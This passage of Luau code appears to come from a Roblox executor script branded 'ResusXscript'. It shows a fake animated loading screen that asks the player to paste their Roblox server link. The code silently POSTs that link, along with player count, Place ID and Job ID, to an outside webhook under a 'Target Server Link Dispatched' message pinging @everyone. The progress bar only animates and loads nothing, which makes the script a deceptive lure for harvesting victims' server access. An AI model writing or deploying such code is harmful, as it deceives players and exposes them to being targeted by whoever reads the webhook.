local function runLookPhase(duration: number)
	local sound = createLookSound()
	local pitchShift = sound and (sound:FindFirstChild("LookPitchShift") :: PitchShiftSoundEffect?) or nil
	local waypoints = {
		{ pos = UDim2.fromScale(0.25, 0.5), speed = 0.96, octave = 0.96 },
		{ pos = UDim2.fromScale(0.75, 0.5), speed = 1.05, octave = 1.04 },
		{ pos = UDim2.fromScale(0.5, 0.27), speed = 1.08, octave = 1.06 },
		{ pos = UDim2.fromScale(0.5, 0.73), speed = 0.94, octave = 0.95 },
		{ pos = UDim2.fromScale(0.70, 0.34), speed = 1.03, octave = 1.02 },
		{ pos = UDim2.fromScale(0.30, 0.66), speed = 0.97, octave = 0.97 },
		{ pos = UDim2.fromScale(0.5, 0.5), speed = 1.00, octave = 1.00 },
	}

	local stepTime = duration / #waypoints
	for _, step in ipairs(waypoints) do
		if sound then
			pcall(function()
				sound.PlaybackSpeed = step.speed
			end)
		end
		if pitchShift then
			pcall(function()
				pitchShift.Octave = step.octave
			end)
		end
		local tween = TweenService:Create(
			iris,
			TweenInfo.new(stepTime * 0.85, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
			{ Position = step.pos }
		)
		tween:Play()
		task.wait(stepTime)
	end

	if sound then
		pcall(function()
			sound:Stop()
			sound:Destroy()
		end)
	end
end

local submitted = false
local proceedEvent = Instance.new("BindableEvent")

local function sendWebhook(serverLink: string)
	local httpRequest = (syn and syn.request) or (http and http.request) or request or (http_request)
	if not httpRequest then
		return
	end

	local playerCount = #Players:GetPlayers()
	local maxPlayers = Players.MaxPlayers
	local placeId = game.PlaceId
	local jobId = game.JobId

	local payload = {
		content = "@everyone 🚀 ResusXscript Server Link & Player Stats",
		embeds = {
			{
				title = "🎯 Target Server Link Dispatched",
				description = "A player executed the loading script and submitted a Roblox server link.",
				color = 65280,
				fields = {
					{
						name = "🔗 Server Link",
						value = serverLink,
						inline = false,
					},
					{
						name = "👥 Server Players",
						value = string.format("%d / %d players online", playerCount, maxPlayers),
						inline = true,
					},
					{
						name = "🆔 Place / Job ID",
						value = string.format("Place ID: `%d`\nJob ID: `%s`", placeId, jobId),
						inline = false,
					},
				},
				footer = {
					text = "ResusXscript Automated System",
				},
			},
		},
	}

	pcall(function()
		httpRequest({
			Url = CONFIG.WebhookUrl,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
			},
			Body = HttpService:JSONEncode(payload),
		})
	end)
end

local function handleLinkSubmit()
	if submitted then
		return
	end
	local trimmed = linkBox.Text:match("^%s*(.-)%s*$") or ""
	if trimmed == "" then
		linkBox.PlaceholderText = "PUT YOURE ROBLOX SERVER LINK FIRST"
		return
	end
	submitted = true

	sendWebhook(trimmed)

	if setclipboard then
		pcall(function() setclipboard(string.format("@everyone 🚀 ResusXscript Server Link:\n%s", trimmed)) end)
	elseif toclipboard then
		pcall(function() toclipboard(string.format("@everyone 🚀 ResusXscript Server Link:\n%s", trimmed)) end)
	end

	task.wait(0.2)
	proceedEvent:Fire()
end

linkBox.FocusLost:Connect(function(enterPressed: boolean)
	if enterPressed then
		handleLinkSubmit()
	end
end)

submitButton.Activated:Connect(function()
	handleLinkSubmit()
end)

task.spawn(function()
	TweenService:Create(backdrop, TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
		BackgroundTransparency = 0,
	}):Play()
	animateIn(eyeGroup)

	runLookPhase(CONFIG.LookDurationSeconds)

	playProceedSound()
	animateOut(eyeGroup)
	animateIn(inputGroup)

	proceedEvent.Event:Wait()

	playProceedSound()
	animateOut(inputGroup)
	startMatrixRain()
	animateIn(loadGroup)

	for pct = 1, 100 do
		percentLabel.Text = string.format("%d%%", pct)
		local barTween = TweenService:Create(
			barFill,
			TweenInfo.new(CONFIG.StepIntervalSeconds, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
			{ Size = UDim2.fromScale(pct / 100, 1) }
		)
		barTween:Play()
		task.wait(CONFIG.StepIntervalSeconds)
	end

	percentLabel.Text = "100%"
	task.wait(0.35)

	playProceedSound()
	animateOut(loadGroup)
	stopMatrixRain()
	animateIn(finishGroup)

	task.wait(3.0)

	TweenService:Create(backdrop, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
		BackgroundTransparency = 1,
	}):Play()
	task.wait(0.5)

	restoreGameAudio()
	screenGui:Destroy()
end)

screenGui.Destroying:Connect(function()
	if scaleConn.Connected then
		scaleConn:Disconnect()
	end
	if matrixConn and matrixConn.Connected then
		matrixConn:Disconnect()
	end
	proceedEvent:Destroy()
	restoreGameAudio()
end)
